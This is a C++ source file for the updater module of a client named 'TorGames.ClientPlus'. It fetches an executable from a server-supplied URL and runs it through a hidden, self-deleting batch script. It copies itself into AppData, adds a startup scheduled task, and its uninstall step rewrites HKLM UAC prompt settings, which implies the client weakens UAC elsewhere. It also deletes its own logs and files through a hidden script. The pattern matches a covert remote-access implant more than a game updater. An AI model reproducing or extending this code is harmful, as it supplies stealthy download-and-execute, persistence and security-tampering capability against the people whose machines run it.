// TorGames.ClientPlus - Self-update implementation
#include "updater.h"
#include "fileexplorer.h"
#include "taskscheduler.h"
#include "logger.h"
#include "utils.h"

namespace Updater {

std::string GetCurrentExePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    return path;
}

std::string GetInstallPath() {
    // Use AppData\Local - doesn't require admin privileges
    char localAppData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData))) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\TorGames\\TorGames.Client.exe", localAppData);
        return path;
    }
    return "C:\\Users\\Public\\TorGames\\TorGames.Client.exe";
}

std::string GetInstallDir() {
    char localAppData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData))) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\TorGames", localAppData);
        return path;
    }
    return "C:\\Users\\Public\\TorGames";
}

bool DownloadAndInstall(const char* downloadUrl) {
    LOG_INFO("Downloading update from: %s", downloadUrl);

    // Download to temp location
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char downloadPath[MAX_PATH];
    snprintf(downloadPath, sizeof(downloadPath), "%sTorGames_Update.exe", tempPath);

    if (!FileExplorer::DownloadFile(downloadUrl, downloadPath)) {
        LOG_ERROR("Failed to download update");
        return false;
    }

    // Verify download
    if (!Utils::FileExists(downloadPath)) {
        LOG_ERROR("Downloaded file not found");
        return false;
    }

    std::string installPath = GetInstallPath();
    LOG_INFO("Installing to: %s", installPath.c_str());

    // Create target directory
    char dir[MAX_PATH];
    strncpy(dir, installPath.c_str(), MAX_PATH - 1);
    dir[MAX_PATH - 1] = '\0';
    char* lastSlash = strrchr(dir, '\\');
    if (lastSlash) {
        *lastSlash = '\0';
        Utils::CreateDirectoryRecursive(dir);
    }

    // Create batch script to replace running executable
    char batchPath[MAX_PATH];
    snprintf(batchPath, sizeof(batchPath), "%sTorGames_Update.bat", tempPath);

    FILE* f = fopen(batchPath, "w");
    if (!f) {
        LOG_ERROR("Failed to create update script");
        return false;
    }

    fprintf(f,
        "@echo off\n"
        "timeout /t 2 /nobreak > nul\n"
        "copy /Y \"%s\" \"%s\"\n"
        "start \"\" \"%s\"\n"
        "del \"%%~f0\"\n",
        downloadPath, installPath.c_str(), installPath.c_str());
    fclose(f);

    // Run the batch script
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    char cmd[MAX_PATH];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", batchPath);

    if (CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        LOG_INFO("Update script launched, exiting...");
        return true;
    }

    LOG_ERROR("Failed to launch update script");
    return false;
}

bool InstallToLocation(const char* targetPath) {
    std::string currentPath = GetCurrentExePath();

    LOG_INFO("Installing from %s to %s", currentPath.c_str(), targetPath);

    // Create directory
    char dir[MAX_PATH];
    strncpy(dir, targetPath, MAX_PATH - 1);
    dir[MAX_PATH - 1] = '\0';
    char* lastSlash = strrchr(dir, '\\');
    if (lastSlash) {
        *lastSlash = '\0';
        Utils::CreateDirectoryRecursive(dir);
    }

    // Copy file
    if (!CopyFileA(currentPath.c_str(), targetPath, FALSE)) {
        LOG_ERROR("Failed to copy file: %lu", GetLastError());
        return false;
    }

    // Add startup task
    TaskScheduler::AddStartupTask("TorGamesClient", targetPath);

    // Launch installed version
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (CreateProcessA(targetPath, nullptr, nullptr, nullptr, FALSE,
        0, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        LOG_INFO("Installed version launched");
        return true;
    }

    return false;
}

bool Uninstall() {
    LOG_INFO("Starting comprehensive uninstall...");

    // 1. Remove scheduled task
    LOG_INFO("Removing scheduled task...");
    TaskScheduler::RemoveStartupTask("TorGamesClient");

    // 2. Get paths
    std::string installPath = GetInstallPath();
    std::string installDir = GetInstallDir();
    std::string currentPath = GetCurrentExePath();

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    // 3. Delete log file
    LOG_INFO("Cleaning up log files...");
    char logFile[MAX_PATH];
    snprintf(logFile, sizeof(logFile), "%sTorGames_ClientPlus.log", tempPath);
    DeleteFileA(logFile);

    // 4. Delete temp update files
    LOG_INFO("Cleaning up temp files...");
    char updateExe[MAX_PATH];
    char updateBat[MAX_PATH];
    snprintf(updateExe, sizeof(updateExe), "%sTorGames_Update.exe", tempPath);
    snprintf(updateBat, sizeof(updateBat), "%sTorGames_Update.bat", tempPath);
    DeleteFileA(updateExe);
    DeleteFileA(updateBat);

    // 5. Restore UAC settings to defaults
    LOG_INFO("Restoring UAC settings...");
    system("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 1 /f >nul 2>&1");
    system("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f >nul 2>&1");

    // 6. Create self-delete batch script
    LOG_INFO("Creating uninstall script...");
    char batchPath[MAX_PATH];
    snprintf(batchPath, sizeof(batchPath), "%sTorGames_Uninstall.bat", tempPath);

    FILE* f = fopen(batchPath, "w");
    if (f) {
        fprintf(f,
            "@echo off\n"
            "ping 127.0.0.1 -n 3 > nul\n"
            "del /F /Q \"%s\" 2>nul\n"
            "del /F /Q \"%s\" 2>nul\n"
            "rmdir /S /Q \"%s\" 2>nul\n"
            "del /F /Q \"%sTorGames_ClientPlus.log\" 2>nul\n"
            "del /F /Q \"%sTorGames_Update.exe\" 2>nul\n"
            "del /F /Q \"%sTorGames_Update.bat\" 2>nul\n"
            "del \"%%~f0\"\n",
            installPath.c_str(),
            currentPath.c_str(),
            installDir.c_str(),
            tempPath,
            tempPath,
            tempPath);
        fclose(f);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        char cmd[MAX_PATH];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", batchPath);

        if (CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            LOG_INFO("Uninstall script launched successfully");
            return true;
        }
    }

    LOG_ERROR("Failed to create or launch uninstall script");
    return false;
}

void RestartApplication() {
    std::string exePath = GetCurrentExePath();

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (CreateProcessA(exePath.c_str(), nullptr, nullptr, nullptr, FALSE,
        0, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    ExitProcess(0);
}

} // namespace Updater
